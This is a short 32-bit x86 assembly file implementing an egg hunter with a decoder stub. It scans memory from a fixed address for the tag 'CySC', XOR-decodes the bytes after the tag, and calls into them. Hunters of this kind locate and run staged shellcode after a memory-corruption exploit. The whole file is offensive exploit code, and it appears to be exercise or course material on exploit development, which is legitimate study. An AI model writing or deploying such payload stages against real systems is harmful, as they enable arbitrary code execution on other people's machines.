BITS 32
start:
	mov eax, 0xb7504fff
	mov ebx, 'CySC'
compare:
	inc eax
	cmp [eax], ebx
	jne compare
egg_tag_found:
	xor ecx, ecx
	dec cl
decode_loop:
	xor [eax + ecx], al
	loop decode_loop
execute:
	add eax, 4
	call eax